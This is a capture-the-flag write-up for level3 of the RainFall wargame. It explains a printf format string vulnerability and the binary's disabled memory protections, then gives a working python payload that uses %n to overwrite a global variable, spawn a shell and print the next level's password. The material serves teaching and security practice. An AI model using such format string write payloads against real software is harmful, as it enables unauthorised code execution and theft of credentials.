# level3

### Understanding the problem

First, as always we analyze the code through ghidra, we get something looking like this:

```c
void v(void) {
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}
```

The main function is only calling v(). So as we can see this time we use fgets() a secured version of gets() that only takes a specific number of character, here 0x200 which in decimal is 512. the buffer is 520 chars long, longer than the input size accepted in the fgets(). No obvious security breach so far.

We see that in order to solve this exercise and launch a new shell, we need m to be equal to 0x40 which correspond to 64 in decimal, there are no declaration for m tho besides in ghidra at some point with the address 0x0804988c

We also quickly realized that the difference with level2 is the usage of printf instead of puts. Because we know already a lot about this function, we tried something:

```sh
level3@RainFall:~$ ./level3 
%s
Segmentation fault (core dumped)
```

So %s makes the program segfault, the interesting part here is that apparently the input we entered triggered something in printf, which is probably interpreting this %s as a string shared via a variable, but no variabe are present so the program segfault. However by testing a little more we found that:

```sh
level3@RainFall:~$ ./level3 
%d
512
```

The %d is interpreted, and with what ? The next variable in the stack, which apparently is the buffer size. We can now read into the stack with this exploit:

```sh
AAAA %x %x %x %x %x %x %x                                                            
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```

We can see here a buffer that we fill by "AAAA", then the buffer size in hexadecimal form, then 2 addresses in the stack (starts with b), then our buffer again but stored (41 = A), and some random numbers after that. Problem here, how to write something ? We can read but we need somehow to make this mysterious m equal to 64. We just tried to do this:

```sh
level3@RainFall:~$ ./level3 
%m
Success
```

Wwe first thought it was related to the solution but actually %m prints the actual states of errno, since no errors happened, it prints success. Nothing to do with the exercices.

### Strange login output (digression)

This part is, again, probably not gonna help us with this direct exercise but will help us understanding more things about our environment.
When we login we get this message (or similar) everytime:

```bash
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
```

We are first gonna focus on the second part, with the RELRO, STACK CANARY etc... than can be obtained with this command:

```bash
level0@RainFall:~$ hecksec --file /home/user/level3/level3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
```

- RELRO - Relocation Read-Only. In ELF files, binay uses a look-up table called the GOT (Global Offset Table). This GOT is normally writable, so an attacker (us) could write a few bits on this GOT, and redirect code for malicious execution. Having this option desactivated like we have here since the beginning of those levels means that we can write on this GOT. The security added when activated is that the GOT is now read-only.

- STACK CANARY. This helps protecting stack overflows by simply adding random valued that will be validated at the end of the stack. If some malicious input are entered in the stack, the stack canary will be moved down and won't be valid, stopping the program and avoiding stack overflow. Here again it is deactivated since the beginning. (The story says that canary were used to detect toxic gases such as carbon monoxide in workspace). The canary is placed just before the return address so if it is modified we know a bufferflow is happening.

- NX - No-Execute. Here NX option is disabled, it was only enabled on level0 but disabled for the rest of the levels. This option is a built-in technology inside the CPU allowing to split the aread of memory into 2 sections, data, and code. When this option is enabled the memory space for data will not be able to execute code. which means that the stack, the heap or the BSS would not be able to execute code, for example when using a shellcode, if the NX bit was enabled, the code would not have been interpreted and executed but only read as data.

- PIE - Position Independent Executable. ELF files have a fixed base address space and code must be executed at this address in order to work. We saw it multiple time already but the code is loaded at 0x08048000 address space everytime which helps us to use it as valuable informations to make buffer overflow when this option is deactivated. For all levels so far this option have been deactivated.

- RPATH and RUNPATH define if the libraries on runtime are seached hard coded or not, having NO RPATH and NO RUNPATH is more secured to avoid arbitrary code execution.

As for the first part we have some elements that shows kernel security, they appears only when login in, where the program informations are printed when changing user. They just show some more protections that we can quickly describe like this using this command:

```
checksec --kernel
```

- GCC stack protector - when enable helps to protect buffer overflows. Here it is activated but never seemed to protect anything so far since all our buffer overflows exploits worked well.

- Strict user copy checks - disabled here, if it was activated it blocks certains interactions users have, for example not allowing them to copy files to kernel-spaces, and enforce user space memories rules.

- Read-only kernel data - Restrict /dev/mem - Restrict /dev/kmem - Those 3 options just add some security to prevent kernel memory modifications or simply access to any user, avoiding reading memory of certains area of the machine that could give very sensitive informations.

- grsecurity, PaX / Kernel Heap Hardening - Same thing they are both kernel protections, but those 2 are not enabled where the 3 we presented before are.

- ASLR - Address Space Layout Randomization is here not activated. As its name says, it allows the machine memory to not have fixed starting addresses but to be randomized, avoiding to know for instance that stacks memory starts by 0xb.

### Format String Vulnerability

The first thing we need to find is a way to write in the memory, because as far as we know, m is a global variable, declared but not set, so it is stored in bss space of the memory (this can be confirmed with objdump), if this variable is unset (and doesn't seem to be set anywhere in the program), we need to write 64 in it. For that we have this very weird but existing option in printf which is %n. %n allows us to __write__ the number of bytes printed so far at a certain address. The regular usage of it is as such:

```c
printf("This, is an %nexample", &addr);
```

This is gonna store 12 in addr (so the length of "This, is an "), into the next address present in memory, so here addr.

Here the next space in memory contains 0x200, for 512 in decimal and is probably the buffer size, so if we write %n, it is gonna try to write in the address memory 0x00000200 which is obviously not accessible by the program and will segfault:

```sh
level3@RainFall:~$ ./level3 
%n
Segmentation fault (core dumped)
```

So we need to somehow replace the address right next to the %n argument for the one of m. We also need to have a buffer of 64 chars before the %n so the value printed in m is 64 and fulfill the if statement. Thankfully we noticed that by printing a bunch of "%x" values, the buffer is stored not too far from where we're writing (stdin opened by fgets). So as a first try we just tried to print the addres, and a %n, and it segfault. Then trying to fill the space with random data to reach the 64 chars length, but same thing it segfault.

This last step of understanding took a looottttt of time to understand, but this is how it work. When entering the data in fgets, the values are passed to printf. When printf encounter a specific parameter such as %x, it is gonna "consume" a value from the stack, moving the stack pointer by one (It doesn't affect the rest of the execution, it is just consuming values inside printf, not for the rest of the execution). Which mean that if we could move the stack pointer to the space in the buffer when the address of m is, fill this buffer of 64 chars and finish it with a %n, then it should work. And it does:

```sh
level3@RainFall:~$ echo $(python -c "print('\x8c\x98\x04\x08' + '%x ' * 3 + 'A' * 38 + '%n')") > /tmp/payload
level3@RainFall:~$ cat /tmp/payload -| ./level3
�200 b7fd1ac0 b7ff37d0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Important doc

[Video + short explanation for FSV](https://www.reddit.com/r/C_Programming/comments/18wtu9a/fgets_is_unsafe_so_whats_the_alternative/)

[CTF What's a format string vuln](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

[Exploiting format string vuln](https://medium.com/@gurdeeps158/exploit-format-string-vulnerability-in-printf-6740d9ff057e)

[Memory protection and bypasses](https://mdanilor.github.io/posts/memory-protections/)

[Checksec explained](https://medium.com/@slimm609/checksec-d4131dff0fca)
